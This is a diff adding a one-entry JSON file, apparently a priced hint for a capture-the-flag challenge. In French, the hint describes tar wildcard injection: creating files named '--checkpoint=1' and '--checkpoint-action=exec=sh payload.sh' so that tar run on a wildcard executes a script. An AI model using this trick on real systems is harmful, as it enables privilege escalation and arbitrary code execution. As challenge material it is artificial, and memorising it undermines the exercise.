@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Mécanisme GTFOBins",
+    "cost": 10,
+    "content": "Crée deux fichiers vides : touch -- \"--checkpoint=1\" et touch -- \"--checkpoint-action=exec=sh payload.sh\"."
+  }
+]
